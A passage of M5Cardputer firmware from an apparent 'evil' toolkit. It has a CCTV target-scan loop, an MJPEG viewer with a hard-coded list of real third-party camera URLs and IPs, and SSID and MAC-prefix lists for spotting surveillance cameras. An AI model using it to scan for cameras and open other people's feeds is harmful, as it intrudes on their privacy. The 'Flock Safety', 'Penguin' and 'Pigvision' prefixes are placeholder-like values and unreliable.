  g_scanFromSD = true;

  Serial.printf("[INFO] Scanning %u target(s) from file\n", (unsigned)list.size());
  int idx = 0;
  for (const IPAddress& ip : list) {
    ++idx;
    uiBeginHost(ip);
    uiPhase("From file (" + String(idx) + "/" + String((int)list.size()) + ")");
    processCCTVHost(ip);

    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
  }

  // --- NEW: dÃ©sactiver mode SD avant de quitter ---
  g_scanFromSD = false;

  waitAndReturnToMenu("CCTV scan (file) done");
}



#include <M5GFX.h>
#include <SPIFFS.h>
#include <stdarg.h>

// chemin du fichier liste
static const char* CCTV_LIST_PATH = "/evil/CCTV/CCTV_live.txt";

// rÃ©solutions proposÃ©es
static const char* RES_LIST[] = { "160x120", "320x240"};
static const int   RES_COUNT  = 2;

// limites compression
static const int   COMP_MIN = 0;
static const int   COMP_MAX = 90;

// timeouts rÃ©seau / io
static const uint32_t CONNECT_TO_MS             = 8000; // TCP connect
static const uint32_t RW_TIMEOUT_MS             = 8000; // socket timeout par dÃ©faut
static const uint32_t READ_CHUNK_DEADLINE_MS    = 4000; // deadline par chunk
static const uint32_t STREAM_READY_TIMEOUT_MS   = 5000; // 5s: aucune rÃ©ponse/handshake
static const uint32_t STREAM_NO_DATA_TIMEOUT_MS = 5000; // 5s: plus de data en lecture

static const size_t   IO_CHUNK = 3840;

// fichiers temporaires
static const char* SD_TMP_DIR      = "/evil/tmp";
static const char* SD_FILE_A       = "/evil/tmp/mjpeg_a.jpg";
static const char* SD_FILE_B       = "/evil/tmp/mjpeg_b.jpg";
static const char* SPIFFS_FILE_A   = "/a.jpg";
static const char* SPIFFS_FILE_B   = "/b.jpg";

// Ã©cran Cardputer
static const int SCREEN_W = 240;
static const int SCREEN_H = 135;
static const int TOPBAR_H = 12;
//================================================

// -------- Ã©tat global sÃ©lection menu ----------
static int  g_sel_stream  = 0;
static int  g_sel_res_idx = 1; // 0:160x120, 1:320x240
static int  g_sel_comp    = 70;

// ---- sprite pour dÃ©coder puis Ã©tirer ----
static LGFX_Sprite g_spr(&M5.Display);
static bool   g_spr_ready = false;
static int    g_spr_w = 0, g_spr_h = 0;

// ---- logging ----
#define MJLOG(...) do { Serial.printf("[MJPEG] " __VA_ARGS__); } while(0)

void uiPrintf(int x, int y, uint32_t fg, const char* fmt, ...) {
  char buf[160];
  va_list ap; va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  uiText(x, y, buf, fg);
}

// --------- NET UTILS ----------
int readLineCCTV(WiFiClient& c, char* buf, size_t maxlen) {
  int n = c.readBytesUntil('\n', buf, maxlen - 1);
  if (n <= 0) {
    buf[0] = 0;
    return 0;
  }
  while (n > 0 && (buf[n - 1] == '\r' || buf[n - 1] == '\n')) n--;
  buf[n] = 0;
  return n;
}
size_t readN(WiFiClient& c, uint8_t* dst, size_t n, uint32_t deadline_ms) {
  size_t got = 0; uint32_t last_progress = millis();
  while (got < n) {
    int r = c.read(dst + got, n - got);
    if (r > 0) {
      got += r;
      last_progress = millis();
    }
    else {
      if (millis() - last_progress > deadline_ms) break;
      delay(1);
    }
  }
  return got;
}

// ---------- URL ----------
struct UrlParts {
  String host, path;
  uint16_t port = 80;
  bool https = false;
};

bool parseUrl(const String& url, UrlParts& o) {
  o = UrlParts{};
  String u = url;
  if (u.startsWith("https://")) {
    o.https = true;
    o.port = 443;
    u.remove(0, 8);
  }
  else if (u.startsWith("http://")) {
    u.remove(0, 7);
  }
  int slash = u.indexOf('/');
  String hostport = (slash >= 0) ? u.substring(0, slash) : u;
  o.path = (slash >= 0) ? u.substring(slash) : "/";
  int colon = hostport.indexOf(':');
  if (colon >= 0) {
    o.host = hostport.substring(0, colon);
    o.port = hostport.substring(colon + 1).toInt();
  }
  else o.host = hostport;
  return o.host.length() > 0;
}
String extractBoundaryCI(const String& contentTypeRaw) {
  String low = contentTypeRaw; low.toLowerCase();
  int p = low.indexOf("boundary=");
  if (p < 0) return "";
  String val = contentTypeRaw.substring(p + 9);
  int sc = val.indexOf(';'); if (sc >= 0) val = val.substring(0, sc);
  val.trim();
  if (val.startsWith("\"") && val.endsWith("\"") && val.length() >= 2) val = val.substring(1, val.length() - 1);
  if (!val.startsWith("--")) val = "--" + val;
  return val;
}
bool sniffBoundary(WiFiClient& client, String& boundary_out, char* lineBuf, size_t lineBufLen, int maxLines = 12) {
  for (int i = 0; i < maxLines; ++i) {
    int n = readLineCCTV(client, lineBuf, lineBufLen);
    if (n <= 0) return false;
    if (lineBuf[0] == '-' && lineBuf[1] == '-') {
      boundary_out = String(lineBuf);
      boundary_out.trim();
      return true;
    }
  }
  return false;
}

// -------- JPEG size parser (SOF) --------
bool getJpegSize(fs::FS& fs, const char* path, int& outW, int& outH) {
  File f = fs.open(path, FILE_READ); if (!f) return false;
  auto read16 = [&](uint16_t &v)->bool { int a = f.read(), b = f.read(); if (a < 0 || b < 0) return false; v = ((uint16_t)a << 8) | b; return true; };
uint16_t soi; if (!read16(soi) || soi != 0xFFD8) {
    f.close();
    return false;
  }
  while (true) {
    int c; do {
      c = f.read();
      if (c < 0) {
        f.close();
        return false;
      }
    } while (c != 0xFF);
    do {
      c = f.read();
      if (c < 0) {
        f.close();
        return false;
      }
    } while (c == 0xFF);
    uint8_t marker = (uint8_t)c; if (marker == 0xD9 || marker == 0xDA) {
      f.close();
      return false;
    }
    uint16_t seglen; if (!read16(seglen) || seglen < 2) {
      f.close();
      return false;
    }
    if ((marker >= 0xC0 && marker <= 0xC3) || (marker >= 0xC5 && marker <= 0xC7) || (marker >= 0xC9 && marker <= 0xCB) || (marker >= 0xCD && marker <= 0xCF)) {
      int p = f.read(); uint16_t h, w; if (p < 0 || !read16(h) || !read16(w)) {
        f.close();
        return false;
      }
      outW = (int)w; outH = (int)h; f.close(); return true;
    } else {
      f.seek(f.position() + ((uint32_t)seglen - 2));
    }
  }
}

// ---------- Sprite / affichage ----------
void ensureSpriteSize(int w, int h) {
  if (!g_spr_ready || w != g_spr_w || h != g_spr_h) {
    if (g_spr_ready) g_spr.deleteSprite();
    g_spr.setColorDepth(16);
    g_spr.createSprite(w, h);
    g_spr_ready = true; g_spr_w = w; g_spr_h = h;
  }
}
void drawTopBar(const String& left, float fps) {
  M5.Display.fillRect(0, 0, SCREEN_W, TOPBAR_H, TFT_BLACK);
  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5.Display.setCursor(2, 1);
  M5.Display.print(left);
  char f[20]; snprintf(f, sizeof(f), "%.1f FPS", fps);
  int tw = M5.Display.textWidth(f);
  M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
  M5.Display.setCursor(SCREEN_W - tw - 2, 1);
  M5.Display.print(f);
}


void drawScaledJpg(fs::FS& fs, const char* filepath) {
  // FenÃªtre utile
  const int viewX = 0;
  const int viewY = TOPBAR_H;
  const int viewW = SCREEN_W;
  const int viewH = SCREEN_H - TOPBAR_H;

  int jw = 0, jh = 0;
  if (!getJpegSize(fs, filepath, jw, jh)) return;   // ex: 320x240 ou 160x120

  // --- cible de dÃ©codage unifiÃ©e : 160x120 ---
  jpeg_div_t div = JPEG_DIV_NONE;
  int cw = 160, ch = 120;   // TAILLE CONTENU EXACTE voulue aprÃ¨s dÃ©codage

  // Si la source est >= 320x240, on force une division par 2 -> 160x120 exact.
  // Sinon (160x120), on garde DIV_NONE pour ne pas rÃ©duire.
  if (jw >= 320 && jh >= 240) {
    div = JPEG_DIV_2;  // impose 1/2 au dÃ©codeur -> 160x120 pour 320x240
  } else {
    div = JPEG_DIV_NONE; // 160x120 natif
  }

  // --- sprite 16bpp Ã  la TAILLE CONTENU ---
  g_spr.deleteSprite();
  g_spr.setColorDepth(16);
  if (!g_spr.createSprite(cw, ch)) return;

  // --- dÃ©codage Ã  la taille EXACTE 160x120 (pas juste "bornes") ---
  g_spr.fillScreen(TFT_BLACK);
  g_spr.drawJpgFile(fs, filepath, 0, 0, cw, ch, 0, 0, div);

  // --- pivot au centre du contenu ---
  g_spr.setPivot(cw * 0.5f, ch * 0.5f);

  // --- Ã©tirement anisotrope vers 240x123 ---
  const float zx = (float)viewW / (float)cw;   // 240 / 160 = 1.5
  const float zy = (float)viewH / (float)ch;   // 123 / 120 â‰ˆ 1.025
  const int   cx = viewX + viewW / 2;
  const int   cy = viewY + viewH / 2;

  M5.Display.setClipRect(viewX, viewY, viewW, viewH);
  g_spr.pushRotateZoom(&M5.Display, cx, cy, 0.0f, zx, zy);
  M5.Display.clearClipRect();

  g_spr.deleteSprite();
}

// ---------- Streams dynamiques depuis SD ----------
struct StreamItem {
  String name;
  String base;
};
static std::vector<StreamItem> g_streams;

String trimBoth(const String& s) {
  String t = s; t.trim(); return t;
}
bool isCommentOrEmpty(const String& s) {
  if (s.length() == 0) return true;
  if (s[0] == '#') return true;
  if (s.startsWith("//")) return true;
  return false;
}
String guessNameFromUrl(const String& url) {
  UrlParts up;
  if (parseUrl(url, up)) return up.host;
  return url;
}
int streamCount() {
  return (int)g_streams.size();
}

bool loadStreamsFromFile(fs::FS& fs, const char* path) {
  g_streams.clear();
  File f = fs.open(path, FILE_READ);
  if (!f) {
    MJLOG("Cannot open list: %s\n", path);
    return false;
  }
  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (isCommentOrEmpty(line)) continue;

    // split "name | url"  (sÃ©parateurs acceptÃ©s: '|', '\t')
    int sep = line.indexOf('|');
    if (sep < 0) sep = line.indexOf('\t');

    String name, url;
    if (sep >= 0) {
      name = trimBoth(line.substring(0, sep));
      url  = trimBoth(line.substring(sep + 1));
    } else {
      url  = trimBoth(line);
      name = guessNameFromUrl(url);
    }
    if (!url.startsWith("http://") && !url.startsWith("https://")) {
      MJLOG("Skip bad url: %s\n", url.c_str());
      continue;
    }
    g_streams.push_back({ name, url });
  }
  f.close();
  MJLOG("Loaded %d stream(s) from %s\n", streamCount(), path);
  return streamCount() > 0;
}

// Fallback compilÃ© (au cas oÃ¹ le fichier manque/vide)
const StreamItem k_fallback_streams[] = {
  { "Golf Atlantide",    "http://camera.golfatlantide.com:8081/mjpg/video.mjpg" },
  { "Algonquin",         "http://webcam.thealgonquin.com:8080/mjpg/video.mjpg" },
  { "WSEiP",             "http://kamera.wseip.edu.pl/mjpg/video.mjpg" },
  { "Montain view",      "http://77.222.181.11:8080/mjpg/video.mjpg" },
  { "ZV Noordwijk",      "http://webcam.zvnoordwijk.nl:82/mjpg/video.mjpg" },
  { "Hotel",             "http://85.196.146.82:3337/mjpg/video.mjpg" },
  { "Larimer County",    "http://htadmcam01.larimer.org/mjpg/video.mjpg" },
  { "Brandts Mine",      "http://brandts.mine.nu:84/mjpg/video.mjpg" },
  { "Mynetname",         "http://e1480d3b88f7.sn.mynetname.net:90/mjpg/video.mjpg" },
  { "Caban",             "http://77.110.219.78/mjpg/video.mjpg" },
  { "Fowilh",            "http://fowilh.dynalias.com:1258/mjpg/video.mjpg" },
  { "Sebewaing Skycam",  "http://skycam.sebewainggigvillage.com/mjpg/video.mjpg" }
};
void loadFallbackStreams() {
  g_streams.clear();
  for (auto &s : k_fallback_streams) g_streams.push_back(s);
  MJLOG("Using fallback list (%d streams)\n", streamCount());
}

// ---------- Helpers UI ----------
String buildUrl(const StreamItem& s, const char* res, int comp) {
  String u = s.base;
  if (u.indexOf('?') < 0) {
    u += "?resolution=";
    u += res;
    u += "&compression=";
    u += comp;
  }
  else {
    u += "&resolution=";
    u += res;
    u += "&compression=";
    u += comp;
  }
  return u;
}

// ====== MENU (rendu sur changement uniquement) ======
void menuDrawStatic() {
  M5.Display.fillScreen(TFT_BLACK);
  uiText(2, 2, "MJPEG Viewer - MENU", TFT_CYAN);
  uiText(2, 58, "ENTER: Lancer   LEFT/RIGHT: Flux", TFT_YELLOW);
  uiText(2, 70, "R: Res  UP/DOWN: Comp  BACKSPACE: Retour", TFT_YELLOW);
}
void menuDrawFields(int streamIdx, int resIdx, int comp) {
  M5.Display.fillRect(0, 18, SCREEN_W, 36, TFT_BLACK);
  uiPrintf(2, 18, TFT_WHITE, "Flux:  [%d/%d] %s", streamIdx + 1, streamCount(), g_streams[streamIdx].name.c_str());
  uiPrintf(2, 30, TFT_WHITE, "Res.:  %s  (touche R)", RES_LIST[resIdx]);
  uiPrintf(2, 42, TFT_WHITE, "Comp.: %d  (UP/DOWN)", comp);
}

// true  => ENTER : lancer le viewer
// false => BACKSPACE / ` : remonter au menu parent (scanCCTVCameras)
bool runMenu() {
  menuDrawStatic();
  int last_stream = -1, last_res = -1, last_comp = -999;
  bool needFields = true;

  // Aucun flux -> attendre BACKSPACE pour remonter
  if (streamCount() == 0) {
    M5.Display.fillScreen(TFT_BLACK);
    uiText(2, 2, "MJPEG Viewer - MENU", TFT_CYAN);
    uiText(2, 18, "Aucun flux. Verifie SD:/evil/CCTV/CCTV_live.txt", TFT_RED);
    uiText(2, 30, "BACKSPACE: Retour / ` : Quit", TFT_YELLOW);
    while (true) {
      M5.update(); M5Cardputer.update();
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;
      if (M5Cardputer.Keyboard.isKeyPressed('`')) return false;
      delay(20);
    }
  }

  if (g_sel_stream >= streamCount()) g_sel_stream = 0;

  while (true) {
    M5.update(); M5Cardputer.update();

    // navigation flux (',' et '/')
    bool left  = M5Cardputer.Keyboard.isKeyPressed(',');
    bool right = M5Cardputer.Keyboard.isKeyPressed('/');

    if (left)  {
      g_sel_stream = (g_sel_stream - 1 + streamCount()) % streamCount();
      needFields = true;
      delay(140); // anti-rebond
    }
    if (right) {
      g_sel_stream = (g_sel_stream + 1) % streamCount();
      needFields = true;
      delay(140); // anti-rebond
    }

    if (M5Cardputer.Keyboard.isKeyPressed('r')) {
      g_sel_res_idx = (g_sel_res_idx + 1) % RES_COUNT;
      needFields = true;
      delay(140);
    }
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      g_sel_comp = min(COMP_MAX, g_sel_comp + 1);
      needFields = true;
      delay(60);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      g_sel_comp = max(COMP_MIN, g_sel_comp - 1);
      needFields = true;
      delay(60);
    }

    if (needFields || g_sel_stream != last_stream || g_sel_res_idx != last_res || g_sel_comp != last_comp) {
      menuDrawFields(g_sel_stream, g_sel_res_idx, g_sel_comp);
      last_stream = g_sel_stream; last_res = g_sel_res_idx; last_comp = g_sel_comp;
      needFields = false;
    }

    // sorties
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER))     return true;   // lancer viewer
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;  // retour parent
    if (M5Cardputer.Keyboard.isKeyPressed('`'))           return false;  // retour parent

    delay(8);
  }
}



// ---------- MJPEG VIEWER (timeouts 5s, sans goto) ----------
bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* pathB) {
  // true -> revenir au menu ; false -> changer de flux (switch interne)
  UrlParts up;
  if (!parseUrl(String(url), up) || up.https) return true;

  bool exitToMenu = false; // BACKSPACE
  int  switchDelta = 0;    // -1 / +1 pour changer de flux

  while (!exitToMenu && switchDelta == 0) {
    M5.update(); M5Cardputer.update();

    WiFiClient client;
    client.setTimeout(1);

    // statut discret sous la barre
    M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
    uiText(2, TOPBAR_H, "Connexion flux...", TFT_WHITE);

    // ---- TCP connect ----
    uint32_t ready_deadline = millis() + STREAM_READY_TIMEOUT_MS;
    if (!client.connect(up.host.c_str(), up.port, CONNECT_TO_MS)) {
      delay(200);
      continue;
    }

    // ---- HTTP GET ----
    String req;
    req += "GET " + up.path + " HTTP/1.1\r\n";
    req += "Host: " + up.host + ":" + String(up.port) + "\r\n";
    req += "User-Agent: M5Cardputer-MJPEG\r\n";
    req += "Accept: multipart/x-mixed-replace, image/jpeg\r\n";
    req += "Connection: keep-alive\r\n\r\n";
    client.print(req);

    char line[768];
    bool reconnect = false;

    // ---- Status line (deadline 5s) ----
    bool haveStatus = false;
    while (!haveStatus) {
      if (readLineCCTV(client, line, sizeof(line)) > 0) {
        haveStatus = true;
        break;
      }
      if (millis() > ready_deadline) {
        uiText(2, TOPBAR_H, "Timeout 5s (status)", TFT_RED);
        reconnect = true;
        break;
      }
      // clavier pendant attente
      M5.update(); M5Cardputer.update();
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        client.stop();
        return true;
      }
      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        switchDelta = -1;
        client.stop();
        break;
      }
      if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        switchDelta = +1;
        client.stop();
        break;
      }
      delay(5);
    }
    if (!reconnect) {
      if (!strncmp(line, "HTTP/1.1 200", 12) || !strncmp(line, "HTTP/1.0 200", 12)) {
        // OK
      } else {
        // Erreur HTTP => retour menu direct
        client.stop();
        String statusLine = String(line);
        statusLine.trim();
        M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
        uiText(2, TOPBAR_H, (statusLine + " -> retour menu").c_str(), TFT_RED);
        delay(1200);
        return true;
      }
    }
    if (reconnect) {
      client.stop();
      M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
      uiText(2, TOPBAR_H, "Reconnexion...", TFT_YELLOW);
      delay(250);
      continue;
    }

    // ---- Headers (deadline 5s) ----
    String boundary, contentTypeSeen;
    while (true) {
      int n = readLineCCTV(client, line, sizeof(line));
      if (n > 0) {
        String hLow = String(line); hLow.toLowerCase();
        if (hLow.startsWith("content-type:")) {
          contentTypeSeen = String(line);
          String low = contentTypeSeen; low.toLowerCase();
          int p = low.indexOf("boundary=");
          if (p >= 0) {
            String val = contentTypeSeen.substring(p + 9);
            int sc = val.indexOf(';'); if (sc >= 0) val = val.substring(0, sc);
            val.trim();
            if (val.startsWith("\"") && val.endsWith("\"") && val.length() >= 2) val = val.substring(1, val.length() - 1);
            if (!val.startsWith("--")) val = "--" + val;
            boundary = val;
          }
        }
      } else {
        if (client.available() == 0) {
          if (millis() > ready_deadline) {
            uiText(2, TOPBAR_H, "Timeout 5s (headers)", TFT_RED);
            reconnect = true;
          } else {
            // clavier pendant attente
            M5.update(); M5Cardputer.update();
            if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
              client.stop();
              return true;
            }
            if (M5Cardputer.Keyboard.isKeyPressed(',')) {
              switchDelta = -1;
              client.stop();
              break;
            }
            if (M5Cardputer.Keyboard.isKeyPressed('/')) {
              switchDelta = +1;
              client.stop();
              break;
            }
            delay(5);
            continue;
          }
        }
        break; // data dispo -> fin headers
      }
      if (!line[0]) break; // blank line -> fin headers
    }
    if (reconnect) {
      client.stop();
      M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
      uiText(2, TOPBAR_H, "Reconnexion...", TFT_YELLOW);
      delay(250);
      continue;
    }

    // ---- Sniff boundary si manquant (deadline 5s) ----
    bool alreadySyncedFirstPart = false;
    if (!boundary.length()) {
      while (true) {
        int n = readLineCCTV(client, line, sizeof(line));
        if (n > 0) {
          if (line[0] == '-' && line[1] == '-') {
            boundary = String(line);
            boundary.trim();
            alreadySyncedFirstPart = true;
            break;
          }
        } else {
          if (millis() > ready_deadline) {
            uiText(2, TOPBAR_H, "Timeout 5s (boundary)", TFT_RED);
            reconnect = true;
            break;
          }
          // clavier pendant attente
          M5.update(); M5Cardputer.update();
          if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            client.stop();
            return true;
          }
          if (M5Cardputer.Keyboard.isKeyPressed(',')) {
            switchDelta = -1;
            client.stop();
            break;
          }
          if (M5Cardputer.Keyboard.isKeyPressed('/')) {
            switchDelta = +1;
            client.stop();
            break;
          }
          delay(5);
        }
      }
    }
    if (reconnect) {
      client.stop();
      M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
      uiText(2, TOPBAR_H, "Reconnexion...", TFT_YELLOW);
      delay(250);
      continue;
    }

    // Nettoie la zone "statut"
    M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);

    // FPS state & topbar
    uint32_t fpsT0 = millis();
    uint32_t fpsFrames = 0;
    float    lastFPS = 0.0f;
    String left = g_streams[g_sel_stream].name + "  " + RES_LIST[g_sel_res_idx] + "  c=" + String(g_sel_comp);
    drawTopBar(left, lastFPS);

    bool useA = true;
    uint32_t lastDataMs = millis();

    // === boucle frames ===
    while (!exitToMenu && switchDelta == 0) {
      M5.update(); M5Cardputer.update();

      bool leftKey  = M5Cardputer.Keyboard.isKeyPressed(',');
      bool rightKey = M5Cardputer.Keyboard.isKeyPressed('/');

      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        exitToMenu = true;
        break;
      }
      if (leftKey)  {
        switchDelta = -1;
        break;
      }
      if (rightKey) {
        switchDelta = +1;
        break;
      }

      // No-data watchdog
      if (millis() - lastDataMs > STREAM_NO_DATA_TIMEOUT_MS) {
        uiText(2, TOPBAR_H, "No data 5s -> reconnect", TFT_YELLOW);
        reconnect = true;
        break;
      }

      // sync boundary
      bool synced = alreadySyncedFirstPart; alreadySyncedFirstPart = false;
      if (!synced) {
        while (true) {
          int n = readLineCCTV(client, line, sizeof(line));
          if (n <= 0) {
            if (client.available() == 0) break;
            else {
              synced = true;
              lastDataMs = millis();
              break;
            }
          }
          if (String(line).startsWith(boundary)) {
            synced = true;
            lastDataMs = millis();
            break;
          }
        }
        if (!synced) {
          reconnect = true;
          break;
        }
      }

      // headers part
      size_t contentLen = 0; bool haveLen = false; bool headerEnd = false;
      while (true) {
        int n = readLineCCTV(client, line, sizeof(line));
        if (n <= 0) {
          if (client.available() > 0) headerEnd = true;
          break;
        }
        lastDataMs = millis();
        if (String(line).startsWith(boundary)) continue;
        if (!line[0]) {
          headerEnd = true;
          break;
        }
        String hl = String(line); hl.toLowerCase();
        if (hl.startsWith("content-length:")) {
          contentLen = hl.substring(15).toInt();
          haveLen = contentLen > 0;
        }
      }
      if (!headerEnd) {
        reconnect = true;
        break;
      }

      // fichier cible
      const char* filepath = useA ? pathA : pathB; useA = !useA;
      File f = fs.open(filepath, FILE_WRITE); if (!f) {
        reconnect = true;
        break;
      }

      bool ok = true; size_t totalWritten = 0; uint8_t buf[IO_CHUNK];

      if (haveLen && contentLen > 0) {
        MJLOG("[MJPEG-DBG] Expecting %u bytes for frame\n", (unsigned)contentLen);
        size_t remain = contentLen;
        while (remain > 0) {
          size_t toRead = (remain > IO_CHUNK) ? IO_CHUNK : remain;
          size_t got = readN(client, buf, toRead, READ_CHUNK_DEADLINE_MS);
          if (got == 0) {
            MJLOG("[MJPEG-DBG] Timeout/chunk read fail, remain=%u\n", (unsigned)remain);
            ok = false;
            break;
          }
          lastDataMs = millis();
          if (f.write(buf, got) != got) {
            ok = false;
            break;
          }
          remain -= got; totalWritten += got;
        }
      } else {
        bool lastFF = false; uint32_t waitStart = millis();
        while (true) {
          int avail = client.available();
          int want  = (avail > 0) ? min(avail, (int)IO_CHUNK) : 1;
          int r = client.read(buf, want);
          if (r <= 0) {
            if (millis() - waitStart > READ_CHUNK_DEADLINE_MS) {
              MJLOG("[MJPEG-DBG] Timeout before EOI, bytes=%u\n", (unsigned)totalWritten);
              ok = false;
              break;
            }
            delay(1); continue;
          }
          waitStart = millis(); lastDataMs = millis();
          for (int i = 0; i < r; ++i) {
            uint8_t b = buf[i];
            if (f.write(&b, 1) != 1) {
              MJLOG("[MJPEG-DBG] Write fail mid-frame\n");
              ok = false;
              break;
            }
            totalWritten++;
            if (lastFF && b == 0xD9) {
              i = r;  // EOI
              break;
            }
            lastFF = (b == 0xFF);
          }
          if (!ok) break;
        }
      }
      f.close();
      if (!ok || totalWritten < 32) {
        reconnect = true;
        break;
      }

      // affichage (ne touche pas la barre)
      drawScaledJpg(fs, filepath);

      // FPS stable (maj 1x/s)
      fpsFrames++;
      uint32_t now = millis();
      if (now - fpsT0 >= 1000) {
        lastFPS = fpsFrames * 1000.0f / (float)(now - fpsT0);
        fpsFrames = 0; fpsT0 = now;
        drawTopBar(left, lastFPS);
      }
    } // frames

    client.stop();

    if (reconnect && !exitToMenu && switchDelta == 0) {
      // BACKSPACE pendant reconnexion
      M5.update(); M5Cardputer.update();
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) || 
          M5Cardputer.Keyboard.isKeyPressed('`')) {
        return true;
      }
      M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
      uiText(2, TOPBAR_H, "Reconnexion...", TFT_YELLOW);

      for (uint16_t t = 0; t < 250; t += 20) {
        delay(20);
        M5.update(); M5Cardputer.update();
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) || 
            M5Cardputer.Keyboard.isKeyPressed('`')) {
          return true;
        }
      }
      continue;
    }

  } // while session

  if (switchDelta != 0) {
    if (streamCount() > 0)
      g_sel_stream = (g_sel_stream + switchDelta + streamCount()) % streamCount();
    return false; // relancer viewer direct (sans repasser par menu)
  }
  return true; // retour menu
}



void runCCTV_MJPEGViewer() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return; // retour au menu principal
  }
  enterDebounce();
  M5.Display.setTextSize(1);

  bool spiffs_ok = false;
  bool sd_ok = true;
  if (!sd_ok) spiffs_ok = SPIFFS.begin(true);
  if (!sd_ok && !spiffs_ok) {
    uiText(2, 2, "No SD/SPIFFS. Aborting.", TFT_RED);
    while (1) delay(1000);
  }
  if (sd_ok && !SD.exists(SD_TMP_DIR)) SD.mkdir(SD_TMP_DIR);

  // Charger la liste depuis SD; sinon fallback compilÃ©
  if (!sd_ok || !loadStreamsFromFile(SD, CCTV_LIST_PATH)) {
    loadFallbackStreams();
  }

  fs::FS* pfs = sd_ok ? (fs::FS*)&SD : (fs::FS*)&SPIFFS;
  const char* fileA = sd_ok ? SD_FILE_A : SPIFFS_FILE_A;
  const char* fileB = sd_ok ? SD_FILE_B : SPIFFS_FILE_B;

  // Boucle globale : on reste ici tant que l'utilisateur ne remonte pas au menu parent
  while (!M5Cardputer.Keyboard.isKeyPressed('`')) {
    // --- Menu de sÃ©lection des flux ---
    bool launch = runMenu();   // true = ENTER (lancer), false = BACKSPACE/` (retour parent)
    if (!launch) return;       // <- retour Ã  scanCCTVCameras (menu parent)

    if (streamCount() == 0) return;

        // --- Boucle viewer : permettre switch +/- sans repasser par le menu de sÃ©lection ---
    while (true) {
      String url = buildUrl(g_streams[g_sel_stream], RES_LIST[g_sel_res_idx], g_sel_comp);
      bool backToMenu = mjpegViewerFS(url.c_str(), *pfs, fileA, fileB);
      if (backToMenu) {
        backDebounce();
        break; // on sort uniquement si BACKSPACE (menu)
      }
      // sinon mjpegViewerFS a changÃ© g_sel_stream -> on relance direct sans break
    }
  }
}

#include <pgmspace.h>

// =========================
// 1) LISTES HARDCODÃ‰ES (PROGMEM)
// =========================

// SSID (prÃ©fixes/motifs)
const char ssid0[]  PROGMEM = "IPCAM";
const char ssid1[]  PROGMEM = "IPCAM_";
const char ssid2[]  PROGMEM = "IPC-";
const char ssid3[]  PROGMEM = "IPC_";
const char ssid4[]  PROGMEM = "PV-";
const char ssid5[]  PROGMEM = "MATECAM_X1";
const char ssid6[]  PROGMEM = "WIFICAMERA";
const char ssid7[]  PROGMEM = "HDCAM";
const char ssid8[]  PROGMEM = "HDWIFICAM";
const char ssid9[]  PROGMEM = "CAMP2P";
const char ssid10[] PROGMEM = "P2P_";
const char ssid11[] PROGMEM = "ICAM";
const char ssid12[] PROGMEM = "NETCAM";
const char ssid13[] PROGMEM = "GW_IPC";

// flock-you 
const char ssid14[] PROGMEM = "FLOCK";      // flock*
const char ssid15[] PROGMEM = "PENGUIN";    // Penguin*
const char ssid16[] PROGMEM = "PIGVISION";  // Pigvision*
const char ssid17[] PROGMEM = "FS_";        // FS_*


const char* const HC_SPYCAM_SSID_LIST[] PROGMEM = {
  ssid0, ssid1, ssid2, ssid3, ssid4, ssid5, ssid6, ssid7,
  ssid8, ssid9, ssid10, ssid11, ssid12, ssid13,
  ssid14, ssid15, ssid16, ssid17
};

const uint8_t HC_SPYCAM_SSID_COUNT =
  sizeof(HC_SPYCAM_SSID_LIST) / sizeof(HC_SPYCAM_SSID_LIST[0]);

// OUIs (AA:BB:CC)
const char oui0[]  PROGMEM = "10:A4:BE";
const char oui1[]  PROGMEM = "0C:8C:24";
const char oui2[]  PROGMEM = "74:EE:2A";
const char oui3[]  PROGMEM = "94:BA:06";
const char oui4[]  PROGMEM = "14:6B:9C";
const char oui5[]  PROGMEM = "28:F3:66";
const char oui6[]  PROGMEM = "20:F4:1B";
const char oui7[]  PROGMEM = "34:7D:E4";

const char oui8[]  PROGMEM = "D4:B7:61";
const char oui9[]  PROGMEM = "40:24:B2";
const char oui10[] PROGMEM = "18:EF:3A";
const char oui11[] PROGMEM = "30:88:41";
const char oui12[] PROGMEM = "4C:24:CE";
const char oui13[] PROGMEM = "50:E4:78";
const char oui14[] PROGMEM = "60:1D:9D";
const char oui15[] PROGMEM = "70:C9:12";
const char oui16[] PROGMEM = "B4:61:E9";
const char oui17[] PROGMEM = "0C:CD:B4";

const char oui18[] PROGMEM = "98:D8:63";
const char oui19[] PROGMEM = "F0:FE:6B";
const char oui20[] PROGMEM = "D4:27:87";
const char oui21[] PROGMEM = "E8:FD:F8";

// flock-you
const char oui22[] PROGMEM = "AA:BB:CC";  // Flock Safety
const char oui23[] PROGMEM = "DD:EE:FF";  // Penguin
const char oui24[] PROGMEM = "11:22:33";  // Pigvision


